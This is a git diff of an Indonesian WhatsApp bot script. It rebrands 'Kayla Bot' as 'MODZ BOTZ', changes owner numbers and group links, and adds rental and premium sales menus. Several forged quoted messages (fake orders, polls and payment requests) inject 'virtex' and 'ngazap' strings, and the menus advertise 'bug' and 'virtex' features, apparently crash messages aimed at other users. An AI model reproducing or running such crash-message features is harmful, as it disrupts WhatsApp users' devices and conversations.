@@ -184,12 +184,12 @@ fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
 
 if (isCmd && antiSpam.isFiltered(from) && !m.isGroup) {
 console.log(color('[SPAM]', 'red'), color(wib, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
-return m.reply('「 ❗ 」Sabar Bang 5 Detik/Command')
+return m.reply('SPAM TERDETEKSI SILAHKAN ULANGI PERINTAH SETELAH 10 DETIK')
 }
         
 if (isCmd && antiSpam.isFiltered(from) && m.isGroup) {
 console.log(color('[SPAM]', 'red'), color(wib, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
-return m.reply('「 ❗ 」Sabar Bang 5 Detik/Command')
+return m.reply('SPAM TERDETEKSI SILAHKAN ULANGI PERINTAH SETELAH 10 DETIK')
 }
 
 if (isCmd && !itsMeKayla) antiSpam.addFilter(from)
@@ -265,7 +265,7 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `Kayla Bot WhatsApp`, 
+"caption": `MODZ BOTZ WhatsApp`, 
 "jpegThumbnail": ppnyauser
 }
 }
@@ -276,7 +276,7 @@ key: {
 fromMe: false, 
 participant: `0@s.whatsapp.net`, 
 ...(from ? {
-remoteJid: '6285807264974@s.whatsapp.net' } : {}) }, 
+remoteJid: '6283845409710@s.whatsapp.net' } : {}) }, 
 message: { 
 extendedTextMessage: { 
 text: `${m.pushName}`, 
@@ -339,7 +339,7 @@ participant: `0@s.whatsapp.net`,
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `Kayla Bot WhatsApp${ngazap(prefix)}`,
+"fileName": `MODZ BOTZ WhatsApp${ngazap(prefix)}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
 }}}
 
@@ -353,7 +353,7 @@ N:${await kayla.getName(i + '@s.whatsapp.net')}\n
 FN:${await kayla.getName(i + '@s.whatsapp.net')}\n
 item1.TEL;waid=${i}:${i}\n
 item1.X-ABLabel:Ponsel\n
-item2.EMAIL;type=INTERNET:Faruqmaker/my.id\n
+item2.EMAIL;type=INTERNET:Kamu Nanya?\n
 item2.X-ABLabel:Email\n
 item3.URL:Cek aja yt ku\n
 item3.X-ABLabel:YouTube\n
@@ -371,7 +371,7 @@ participant: `0@s.whatsapp.net`,
 },
 "message": {
 "pollCreationMessage": {
-"name": `Kayla Bot ${virus}${virtex(prefix)}`,
+"name": `MODZ BOTZ ${virus}${virtex(prefix)}`,
 "options": [
 	{
 "optionName": "KATANYA WA KEBAL"
@@ -386,7 +386,7 @@ participant: `0@s.whatsapp.net`,
 "optionName": "KATANYA KEBAL"
 	},
 	{
-"optionName": "SALAM DARI KAYLA BOT"
+"optionName": "SALAM DARI MODZ BOTZ"
 	}
 ],
 "selectableOptionsCount": 5
@@ -396,17 +396,17 @@ const repPy = {
 	key: {
 		remoteJid: '0@s.whatsapp.net',
 		fromMe: false,
-		id: 'Kayla Bot',
+		id: 'MODZ BOTZ',
 		participant: '0@s.whatsapp.net'
 	},
 	message: {
 		requestPaymentMessage: {
 			currencyCodeIso4217: "USD",
-			amount1000: 999999999,
+			amount1000: 4535,
 			requestFrom: '0@s.whatsapp.net',
 			noteMessage: {
 				extendedTextMessage: {
-					text: 'Creator Kayla'
+					text: 'MODZ BOTZ'
 				}
 			},
 			expiryTimestamp: 999999999,
@@ -448,9 +448,9 @@ participant: `0@s.whatsapp.net`,
 "itemCount": 100000000000,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": `Kayla Bot WhatsApp${ngazap(prefix)}`,
-"orderTitle": "Kayla Bot WhatsApp${ngazap(prefix)}",
-"sellerJid": "6285807264974@s.whatsapp.net",
+"message": `MODZ BOTZ WhatsApp${ngazap(prefix)}`,
+"orderTitle": "MODZ BOTZ WhatsApp${ngazap(prefix)}",
+"sellerJid": "6283845409710@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
 "totalCurrencyCode": "IDR"
@@ -532,18 +532,21 @@ templateButtons: [
 ]})
 }
 
-const botzkayla = "6285807264974@s.whatsapp.net"
+const botzkayla = "6283845409710@s.whatsapp.net"
 const mark = "0@s.whatsapp.net"
 const timestamp = speed()
 const latensi = speed() - timestamp
 const butlocNye = [
-{buttonId: `${prefix}owner`, buttonText: {displayText: '𝗢𝗪𝗡𝗘𝗥'}, type: 1},
-{buttonId: `${prefix}sewabot`, buttonText: {displayText: '𝗦𝗘𝗪𝗔𝗕𝗢𝗧'}, type: 1}
+{buttonId: `${prefix}owner`, buttonText: {displayText: 'OWNER'}, type: 1},
+{buttonId: `${prefix}sewabot`, buttonText: {displayText: 'PREMIUM'}, type: 1}
 ]
 const buttonLocnya = {
 location: { jpegThumbnail: ppnyauser } ,
 caption: `Hai Kak @${sender.split("@")[0]} 
-𝘚𝘢𝘺𝘢 𝘒𝘢𝘺𝘭𝘢 𝘉𝘰𝘵 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘠𝘢𝘯𝘨 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘯𝘵𝘶 𝘈𝘯𝘥𝘢 𝘔𝘦𝘮𝘣𝘶𝘢𝘵 𝘚𝘵𝘪𝘤𝘬𝘦𝘳, 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘝𝘪𝘥𝘦𝘰/𝘈𝘶𝘥𝘪𝘰 𝘛𝘪𝘬𝘵𝘰𝘬, 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘝𝘪𝘥𝘦𝘰/𝘈𝘶𝘥𝘪𝘰 𝘠𝘰𝘶𝘵𝘶𝘣𝘦, 𝘔𝘦𝘮𝘣𝘶𝘢𝘵 𝘓𝘰𝘨𝘰 𝘛𝘦𝘹𝘵 𝘗𝘳𝘰/𝘗𝘩𝘰𝘵𝘰𝘰𝘹𝘺/𝘌𝘱𝘩𝘰𝘵𝘰360, 𝘋𝘢𝘯 𝘓𝘢𝘪𝘯-𝘭𝘢𝘪𝘯.
+
+Saya Modz Botz Whatsapp Yang Bisa Membantu Anda Membuat Sticker,
+Download Video/Audio Tiktok,Download Video/Audio YouTubs,Membuat
+Logo Text Pro/Photooxy/Ephoto360,Dan Lain-Lain
 
 Nama ${itsMeKayla ? 'Owner' : 'User'} : ${pushname}
 Nomor ${itsMeKayla ? 'Owner' : 'User'} : ${sender.split("@")[0]}
@@ -554,18 +557,9 @@ Runtime Bot : ${runtime(process.uptime())}
 Speed Bot : ${latensi.toFixed(4)} 𝘋𝘦𝘵𝘪𝘬
 Otw Tahun Baru : ${jhari} 𝑯𝒂𝒓𝒊 ${jjam} 𝑱𝒂𝒎 ${jmenit} 𝑴𝒆𝒏𝒊𝒕 ${jdetik} 𝑫𝒆𝒕𝒊𝒌
 Otw Idul Fitri : ${hahari} 𝑯𝒂𝒓𝒊 ${hajam} 𝑱𝒂𝒎 ${hamenit} 𝑴𝒆𝒏𝒊𝒕 ${hadetik} 𝑫𝒆𝒕𝒊𝒌
-Otw Idul Adha : ${hihari} 𝑯𝒂𝒓𝒊 ${hijam} 𝑱𝒂𝒎 ${himenit} 𝑴𝒆𝒏𝒊𝒕 ${hidetik} 𝑫𝒆𝒕𝒊𝒌
-Otw Ultah Creator : ${kayhari} 𝑯𝒂𝒓𝒊 ${kayjam} 𝑱𝒂𝒎 ${kaymenit} 𝑴𝒆𝒏𝒊𝒕 ${kaydetik} 𝑫𝒆𝒕𝒊𝒌
-
-𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼
-𝗔𝗹𝗹𝗮𝗵 𝗦𝗪𝗧
-𝗡𝗮𝗯𝗶 𝗠𝘂𝗵𝗮𝗺𝗺𝗮𝗱 𝗦𝗔𝗪
-𝗢𝗿𝗮𝗻𝗴 𝗧𝘂𝗮
-𝗞𝗮𝘆𝗹𝗮 𝗕𝗼𝘁
-𝗨𝘀𝗲𝗿 𝗕𝗼𝘁`,
+Otw Idul Adha : ${hihari} 𝑯𝒂𝒓𝒊 ${hijam} 𝑱𝒂𝒎 ${himenit} 𝑴𝒆𝒏𝒊𝒕 ${hidetik} 𝑫𝒆𝒕𝒊?
+`,
 mentions : [sender, botzkayla, mark],
-footer: `Created By @${botzkayla.split("@")[0]}
-WhatsApp By @${mark.split("@")[0]}`,
 buttons: butlocNye,
 headerType: "LOCATION"
 }
@@ -874,7 +868,7 @@ messageId: ""
 
 async function replyprem(teks) {
     let buttons = [
-    { buttonId: '.buypremium', buttonText: { displayText: '⬆️ Upgrade Premium' }, type: 1 }
+    { buttonId: '.buypremium', buttonText: { displayText: ' Upgrade Premium' }, type: 1 }
     ]
     return kayla.sendButtonText(m.chat, buttons, teks, `Jangan Mau Free Yah :(`, m)
 }
@@ -952,28 +946,27 @@ kayla.sendImage(m.chat, buff, `${getkaydata.response}`, m)
 }
 
 const seactions = [{
-title: `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐃𝐈 𝐁𝐀𝐖𝐀𝐇`,
+title: `👇SILAHKAN PILIH LIST MENU YANG ADA DI BAWAH INI👇`,
 rows: [
-{title: `⊟ All menu`, rowId: `${prefix}allmenu`},
-{title: `⊟ Owner menu`, rowId: `${prefix}ownermenu`},
-{title: `⊟ Other menu`, rowId: `${prefix}othermenu`},
-{title: `⊟ Download menu`, rowId: `${prefix}downloadmenu`},
-{title: `⊟ Bug menu🔥`, rowId: `${prefix}bugmenu`},
-{title: `⊟ Group menu`, rowId: `${prefix}groupmenu`},
-{title: `⊟ Fun menu`, rowId: `${prefix}funmenu`},
-{title: `⊟ Stalker menu`, rowId: `${prefix}stalkermenu`},
-{title: `⊟ Foto menu`, rowId: `${prefix}randfotomenu`},
-{title: `⊟ Video menu`, rowId: `${prefix}randvideomenu`},
-{title: `⊟ Text pro menu`, rowId: `${prefix}textpromenu`},
-{title: `⊟ Photo oxy menu`, rowId: `${prefix}photooxymenu`},
-{title: `⊟ Ephoto menu`, rowId: `${prefix}ephoto360menu`},
-{title: `⊟ Cerpen menu`, rowId: `${prefix}cerpenmenu`},
+{title: ` Semua Menu`, rowId: `${prefix}allmenu`},
+{title: ` Owner Menu`, rowId: `${prefix}ownermenu`},
+{title: ` Other menu`, rowId: `${prefix}othermenu`},
+{title: ` Download menu`, rowId: `${prefix}downloadmenu`},
+{title: ` Bug menu`, rowId: `${prefix}bugmenu`},
+{title: ` Group menu`, rowId: `${prefix}groupmenu`},
+{title: ` Fun menu`, rowId: `${prefix}funmenu`},
+{title: ` Stalker menu`, rowId: `${prefix}stalkermenu`},
+{title: ` Foto menu`, rowId: `${prefix}randfotomenu`},
+{title: ` Video menu`, rowId: `${prefix}randvideomenu`},
+{title: ` Text pro menu`, rowId: `${prefix}textpromenu`},
+{title: ` Photo oxy menu`, rowId: `${prefix}photooxymenu`},
+{title: ` Ephoto menu`, rowId: `${prefix}ephoto360menu`},
+{title: ` Cerpen menu`, rowId: `${prefix}cerpenmenu`},
 ]}]
 const listMenuMessage = { 
 text: `Silahkan Kak @${sender.split("@")[0]} Pencet Button List Message Nya Di Bawah Ya`,
 mentions: [sender],
-footer: fake,
-buttonText: '🪀 COMMANDS 🪀',
+buttonText: 'KLIK DISINI',
 sections: seactions,
 listType: 1}
 
@@ -1029,8 +1022,73 @@ mentionedJid:[sender],
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": ppnyauser,
-"mediaUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
-"sourceUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl'
+"mediaUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt',
+"sourceUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt'
+}
+}
+})
+break
+case 'script': case 'sc':
+sendohlxMessage(from, { 
+text: `MASIH DALAM PROSES\nJANGAN LUPA SUBSCRIBE YA https://youtube.com/channel/UC5mUj5o2S4zwwGNbPA2J31Q`,
+mentions:[sender],
+contextInfo:{
+mentionedJid:[sender],
+"externalAdReply": {
+"showAdAttribution": true,
+"renderLargerThumbnail": false,
+"title": 'JIKA INGIN BELI SCRIPT NYA KLIK DISINI ', 
+"containsAutoReply": true,
+"mediaType": 1, 
+"thumbnail": ppnyauser,
+"mediaUrl": 'https://api.whatsapp.com/send?phone=+6283845409710',
+"sourceUrl": 'https://api.whatsapp.com/send?phone=+6283845409710'
+}
+}
+})
+break
+case 'premium': case 'sewa': case 'buypremium': case 'sewabot':
+sendohlxMessage(from, { 
+text: `╭━━━━「 𝗦𝗘𝗪𝗔 」
+┊⫹⫺ *Hemat:* _10k/grup (1 Minggu)_
+┊⫹⫺ *Normal:* _20k/grup (1 bulan)_                                         
+┊⫹⫺ *permanen:* = _25k/grup (unlimited)_
+╰═┅═━––––––๑
+
+╭━━━━「 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 」
+┊⫹⫺ *Hemat:* _5k (10 Hari)_
+┊⫹⫺ *Normal:* _10k (1 bulan)_                                       
+┊⫹⫺ *Permanent:* = _20k (Unlimited)_
+╰═┅═━––––––๑
+
+𝗙𝗜𝗧𝗨𝗥 𝗕𝗢𝗧 
+
+➥ 𝗺𝗲𝗻𝘂 𝗸𝗲𝗿𝗲𝗻
+➥ 𝗮𝗻𝘁𝗶𝗹𝗶𝗻𝗸,𝗮𝗻𝘁𝗶𝘄𝗮𝗺𝗲,𝗮𝗻𝘁𝗶𝘁𝗼𝘅𝗶𝗰
+➥ 𝗯𝘂𝘁𝘁𝗼𝗻 𝗺𝗲𝗻𝘂
+➥ 𝗮𝗻𝘁𝗶 𝗲𝗿𝗿𝗼𝗿 𝟭𝟬𝟬%
+➥ 𝘃𝗶𝗿𝘁𝗲𝘅,𝗯𝘂𝗴𝗺𝗲𝗻𝘂,𝘄𝗮𝗿
+➥ 𝗷𝗮𝗱𝗶 𝗯𝗼𝘁
+➥ 𝗷𝗮𝗱𝗶 𝗼𝘄𝗻𝗲𝗿
+
+🗣️: bang arti sewa ama premium apa beda nya
+💬: beda nya sewa buat masuk ke grub ,premium buat buka semua fitur bot yg terkunci
+🗣️: Scam/nipu ga nih kak?
+💬: Enggalah, Owner 100% Tepati janji
+
+Minat? Chat Owner https://api.whatsapp.com/send?phone=+6283845409710`,
+mentions:[sender],
+contextInfo:{
+mentionedJid:[sender],
+"externalAdReply": {
+"showAdAttribution": true,
+"renderLargerThumbnail": true,
+"title": 'INGIN SEWA BOT KLIK DISINI', 
+"containsAutoReply": true,
+"mediaType": 1, 
+"thumbnail": ppnyauser,
+"mediaUrl": 'https://api.whatsapp.com/send?phone=+6283845409710',
+"sourceUrl": 'https://api.whatsapp.com/send?phone=+6283845409710'
 }
 }
 })
@@ -1048,8 +1106,8 @@ mentionedJid:[sender],
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": ppnyauser,
-"mediaUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
-"sourceUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl'
+"mediaUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt',
+"sourceUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt'
 }
 }
 })
@@ -1067,8 +1125,8 @@ mentionedJid:[sender],
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": ppnyauser,
-"mediaUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
-"sourceUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl'
+"mediaUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt',
+"sourceUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt'
 }
 }
 })
@@ -1086,8 +1144,8 @@ mentionedJid:[sender],
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": ppnyauser,
-"mediaUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
-"sourceUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl'
+"mediaUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt',
+"sourceUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt'
 }
 }
 })
@@ -1105,8 +1163,8 @@ mentionedJid:[sender],
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": ppnyauser,
-"mediaUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
-"sourceUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl'
+"mediaUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt',
+"sourceUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt'
 }
 }
 })
@@ -1124,8 +1182,8 @@ mentionedJid:[sender],
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": ppnyauser,
-"mediaUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
-"sourceUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl'
+"mediaUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt',
+"sourceUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt'
 }
 }
 })
@@ -1143,8 +1201,8 @@ mentionedJid:[sender],
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": ppnyauser,
-"mediaUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
-"sourceUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl'
+"mediaUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt',
+"sourceUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt'
 }
 }
 })
@@ -1162,8 +1220,8 @@ mentionedJid:[sender],
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": ppnyauser,
-"mediaUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
-"sourceUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl'
+"mediaUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt',
+"sourceUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt'
 }
 }
 })
@@ -1181,8 +1239,8 @@ mentionedJid:[sender],
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": ppnyauser,
-"mediaUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
-"sourceUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl'
+"mediaUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt',
+"sourceUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt'
 }
 }
 })
@@ -1200,8 +1258,8 @@ mentionedJid:[sender],
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": ppnyauser,
-"mediaUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
-"sourceUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl'
+"mediaUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt',
+"sourceUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt'
 }
 }
 })
@@ -1219,8 +1277,8 @@ mentionedJid:[sender],
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": ppnyauser,
-"mediaUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
-"sourceUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl'
+"mediaUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt',
+"sourceUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt'
 }
 }
 })
@@ -1238,8 +1296,8 @@ mentionedJid:[sender],
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": ppnyauser,
-"mediaUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
-"sourceUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl'
+"mediaUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt',
+"sourceUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt'
 }
 }
 })
@@ -1257,8 +1315,8 @@ mentionedJid:[sender],
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": ppnyauser,
-"mediaUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
-"sourceUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl'
+"mediaUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt',
+"sourceUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt'
 }
 }
 })
@@ -1276,8 +1334,8 @@ mentionedJid:[sender],
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": ppnyauser,
-"mediaUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
-"sourceUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl'
+"mediaUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt',
+"sourceUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt'
 }
 }
 })
@@ -1295,10 +1353,6 @@ reply('Berhasil Mendapatkan Satu Orang')
 setTimeout(() => {
 kayla.sendMessage(from, {text: `Nih Kak @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
 }, 9000)
-break
-case 'sc': case 'scriptbot': case 'scbot':{
-kayla.sendMessage(m.chat,{text:`Mau Script Bot Nya? Silahkan Chat Aja @${creator.split("@")[0]}`,mentions: [creator], },{quoted:m})
-}
 break
 case 'q': case 'quoted': {
 if (!m.quoted) return reply('Reply Pesannya!!')
@@ -1477,7 +1531,7 @@ reply(`Succes`)
 break
 case 'ban':{
 if (!itsMeKayla) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} add/del nomor\nContoh ${prefix+command} add/del 6285807264974`)
+if (!q) return reply(`Penggunaan ${prefix+command} add/del nomor\nContoh ${prefix+command} add/del 6283845409710`)
 orgnye = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
 let ceknye = await kayla.onWhatsApp(orgnye)
 if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
@@ -1515,7 +1569,6 @@ rows: listBloxk
 
 const listMessage = {
 text: teskd,
-footer: fake,
 title: "     「 List Participants Blockir 」",
 buttonText: "List Blockir",
 mentions: await kayla.parseMention(teskd),
@@ -1550,7 +1603,7 @@ break
 case 'menfes': case 'confes':
 if (Object.values(anon.anonymous).find(p => p.check(sender))) return reply("Anda masih didalam room")
 if (m.isGroup) return reply(mess.private)
-if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|isi pesan\nContoh ${prefix+command} 6285807264974|Hai Owner`)
+if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|isi pesan\nContoh ${prefix+command} 6283845409710|Hai Owner`)
 if (text > 700) return reply(`Teks Kepanjangan`)
 num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 pesan = q.split('|')[1]
@@ -1781,7 +1834,7 @@ kayla.sendMessage(m.chat,{audio:{url: tytyd.media[2].url}, mimetype: "audio/mp4"
 }
 break
 case 'googles': {
-if (!q) return reply(`Example : ${prefix + command} KirBotz WhatsApp`)
+if (!q) return reply(`Example : ${prefix + command} bot WhatsApp`)
 let google = require('google-it')
 google({'query': text}).then(res => {
 let teks = `Google Search From : ${text}\n\n`
@@ -1852,7 +1905,7 @@ let search = await yts(text)
 url = search.videos[0].url
 let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
 eek = await getBuffer(anu.thumbnail)
-owned = '6285807264974@s.whatsapp.net'
+owned = '6283845409710@s.whatsapp.net'
 ngen = `
 Title : ${anu.title}
 Ext : Search
@@ -1871,7 +1924,6 @@ jpegThumbnail: eek,
 caption: ngen,
 fileLength: "99999999999",
 mentions:[sender, owned],
-footer: `_Powered By @${owned.split("@")[0]}_`,
 buttons: buttonse,
 headerType: 4,
 contextInfo: {
@@ -1883,8 +1935,8 @@ contextInfo: {
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": eek,
-"mediaUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl',
-"sourceUrl": 'https://chat.whatsapp.com/KG9EraduWh2Bz3mdWbkHjl'
+"mediaUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt',
+"sourceUrl": 'https://chat.whatsapp.com/CNf3yQ3N5omBMVJy3xpvRt'
 }}
 }
 kayla.sendMessage(m.chat, buttonMessages, { quoted: {
@@ -1898,7 +1950,7 @@ orderMessage: {
 itemCount: 99999999,
 status: 1,
 surface: 1,
-message: 'Created By Kayla',
+message: 'Created By modz botz',
 orderTitle: '999999999', 
 sellerJid: `0@s.whatsapp.net` 
 }
@@ -1916,165 +1968,9 @@ if (!text) return reply('Masukan Link Nya!!!')
 downloadMp3(text)
 }
 break
-case 'donasi': case 'donate':{
-kayla.sendMessage(from,{image:qrisdonate, caption:`Hai Kak @${sender.split("@")[0]} Mau ${command}?
-
-Silahkan Scan Qris Di Atas Ya Kak
-Atau Juga Bisa Isi Nomor Payment Di Bawah Ya
-Gopay : ${gopayno}
-Dana : ${danano}
-Shopeepay : ${shopeepayno}
-
-Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`, mentions: [sender]},{quoted:m})
-}
-break
-case 'buypremium': case 'jadiowner': case 'sewabot':{
-const seactiones = [
-{
-title: `LIST SEWABOT`,
-rows: [
-{title: `1 MINGGU`, rowId: `${prefix}sewakay 1minggu`},
-{title: `1 BULAN`, rowId: `${prefix}sewakay 1bulan`},
-{title: `1 TAHUN`, rowId: `${prefix}sewakay 1tahun`},
-{title: `PERMANENT`, rowId: `${prefix}sewakay permanent`},
-]
-},
-{
-title: `LIST PREMIUM`,
-rows: [
-{title: `1 MINGGU`, rowId: `${prefix}premkay 1minggu`},
-{title: `1 BULAN`, rowId: `${prefix}premkay 1bulan`},
-{title: `1 TAHUN`, rowId: `${prefix}premkay 1tahun`},
-{title: `PERMANENT`, rowId: `${prefix}premkay permanent`},
-]
-},
-{
-title: `LIST JADI OWNER`,
-rows: [
-{title: `1 MINGGU`, rowId: `${prefix}ownkay 1minggu`},
-{title: `1 BULAN`, rowId: `${prefix}ownkay 1bulan`},
-{title: `1 TAHUN`, rowId: `${prefix}ownkay 1tahun`},
-{title: `PERMANENT`, rowId: `${prefix}ownkay permanent`},
-]
-}
-]
-const listSw = { 
-text: `Hai Kak @${sender.split("@")[0]} ${ucapanWaktu}`,
-mentions: [sender],
-footer: `Mau ${command} ya? Silahkan Pencet Di Bawah Ya Kak`,
-buttonText: 'SELECT',
-sections: seactiones,
-listType: 1}
-kayla.sendMessage(from, listSw, { quoted: m })
-}
-break
-case 'sewakay':
-if ((args[0]) == '1minggu'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
-📮 : *Paket:* 10K • Sewabot 1 Minggu
-- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
-} else
-if ((args[0]) == '1bulan'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
-📮 : *Paket:* 20K • Sewabot 1 Bulan
-- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
-} else
-if ((args[0]) == '1tahun'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
-📮 : *Paket:* 35K • Sewabot 1 Tahun
-- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
-} else
-if ((args[0]) == 'permanent'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
-📮 : *Paket:* 45K • Sewabot Permanent
-- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
-}
-break
-case 'premkay':
-if ((args[0]) == '1minggu'){
-reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
-kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
-📮 : *Paket:* 10K • Premium 1 Minggu
-- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
-} else
-if ((args[0]) == '1bulan'){
